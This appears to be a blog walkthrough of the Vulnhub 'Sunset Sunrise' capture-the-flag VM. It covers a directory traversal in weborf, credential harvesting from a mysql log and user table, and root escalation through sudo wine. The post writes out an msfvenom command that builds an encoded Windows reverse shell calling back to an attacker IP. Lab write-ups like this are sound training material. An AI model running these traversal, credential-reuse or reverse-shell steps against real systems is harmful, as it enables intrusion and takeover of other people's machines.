---
layout: post
title: Sunset Sunrise Vulnhub VM walkthrough
tags: vulnhub

---

## A review of the [Sunrise](https://www.vulnhub.com/entry/sunset-sunrise,406/) VM from Vulnhub

First I'll give a warning that I think this VM is maybe at the higher-end of being a beginner VM. It's a great machine and everything in it will be useful to take note of for the future, but don't feel bad if you need to consult a walkthrough for this one.

First off, let's do our nmap scan. We can see 4 ports open: 22, 80, 3306 and 8080.

[<img src="{{ site.baseurl }}/images/sunrise/1.png"
 style="width: 800px;"/>]({{ site.baseurl }}/images/sunrise/1.png)

 Accessing port 80 in our browser doesn't show much and a directory scan finds nothing either, so let's move on to port 8080:

 [<img src="{{ site.baseurl }}/images/sunrise/2.png"
  style="width: 800px;"/>]({{ site.baseurl }}/images/sunrise/2.png)

we can see the name and version of the server software. Again directory scans don't find much, but having a look for existing issues finds a directory traversal vulnerability, meaning we can break out of the web application and view any file on the server's hard drive (assuming that the user running weborf has permissions to view that file):

[<img src="{{ site.baseurl }}/images/sunrise/3.png"
 style="width: 800px;"/>]({{ site.baseurl }}/images/sunrise/3.png)  

 [<img src="{{ site.baseurl }}/images/sunrise/4.png"
  style="width: 800px;"/>]({{ site.baseurl }}/images/sunrise/4.png)   

 so let's try it out on /etc/passwd as a proof of concept and see if it works:

 [<img src="{{ site.baseurl }}/images/sunrise/5.png"
  style="width: 800px;"/>]({{ site.baseurl }}/images/sunrise/5.png)

Great so it does, we can see the users _weborf_ and _sunrise_ in there so that might be useful for later. We can explore around the local filesystem and see what we can find, in sunrise's home directory we can view the user flag:

[<img src="{{ site.baseurl }}/images/sunrise/6.png"
 style="width: 800px;"/>]({{ site.baseurl }}/images/sunrise/6.png)

 [<img src="{{ site.baseurl }}/images/sunrise/7.png"
  style="width: 800px;"/>]({{ site.baseurl }}/images/sunrise/7.png)

Here's one place that got me lost down rabbit holes for a while! so here we see the contents of weborf's home directory:

[<img src="{{ site.baseurl }}/images/sunrise/8.png"
 style="width: 800px;"/>]({{ site.baseurl }}/images/sunrise/8.png)   

I spent ages exploring inside that, around other areas of the filesystem looking for config files and the like, but while looking for the .ssh directory it dawned on me that hidden files (ie they begin with . ) aren't being shown, so i'll run another directory scan within this traversal:

[<img src="{{ site.baseurl }}/images/sunrise/9.png"
 style="width: 800px;"/>]({{ site.baseurl }}/images/sunrise/9.png)    

We now have a few more exciting files to try, the mysql log gives us some interesting information:

[<img src="{{ site.baseurl }}/images/sunrise/10.png"
 style="width: 800px;"/>]({{ site.baseurl }}/images/sunrise/10.png)     

This gives us a password weborf has used for mysql, let's see if they re-used that password for their SSH connection:

[<img src="{{ site.baseurl }}/images/sunrise/11.png"
 style="width: 800px;"/>]({{ site.baseurl }}/images/sunrise/11.png)    

Sweet, but again this is a pretty locked down account so let's see if we can use our local access to get any further information. Since we already know the password works on mysql, let's see what's in there.

First we'll log in, then choose our mysql database and view the tables for anything interesting:

[<img src="{{ site.baseurl }}/images/sunrise/12.png"
 style="width: 800px;"/>]({{ site.baseurl }}/images/sunrise/12.png)   

 [<img src="{{ site.baseurl }}/images/sunrise/13.png"
  style="width: 800px;"/>]({{ site.baseurl }}/images/sunrise/13.png)   

So obviously we're all getting very excited about there being a _user_   table there, let's see if it contains any credentials for the other users on the system:

[<img src="{{ site.baseurl }}/images/sunrise/14.png"
 style="width: 800px;"/>]({{ site.baseurl }}/images/sunrise/14.png)   

So we have the password for the sunrise user (who we also saw in /etc/passwd) so let's try to switch to them using *su*:

[<img src="{{ site.baseurl }}/images/sunrise/15.png"
 style="width: 800px;"/>]({{ site.baseurl }}/images/sunrise/15.png)    

and as a first step we'll see if they have any sudo permissions:

[<img src="{{ site.baseurl }}/images/sunrise/16.png"
 style="width: 800px;"/>]({{ site.baseurl }}/images/sunrise/16.png)   

Here we can see they can run _wine_ as the root user. Wine in itself (which runs windows programs on linux) isn't that much of a threat, unless we give it a dodgy windows program to run.

So what we're going to do is create a windows executable which will open a meterpreter connection back to our Kali machine.

A command such as this will work:

    msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=10.0.2.5 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -f exe -o /var/www/html/winbin.exe

Note that I exported it into my webserver directory so that I could easily transfer it over to the client just using wget:

[<img src="{{ site.baseurl }}/images/sunrise/17.png"
 style="width: 800px;"/>]({{ site.baseurl }}/images/sunrise/17.png)     

[<img src="{{ site.baseurl }}/images/sunrise/18.png"
  style="width: 800px;"/>]({{ site.baseurl }}/images/sunrise/18.png)  

And after running the multi/handler listener on my kali machine from within metasploit, I can execute the exe and just watch the shell pop:

    sudo wine winbin.exe

[<img src="{{ site.baseurl }}/images/sunrise/19.png"
      style="width: 800px;"/>]({{ site.baseurl }}/images/sunrise/19.png)  

and after that it's just a case of grabbing the root flag using your new root shell:

[<img src="{{ site.baseurl }}/images/sunrise/20.png"
      style="width: 800px;"/>]({{ site.baseurl }}/images/sunrise/20.png)              
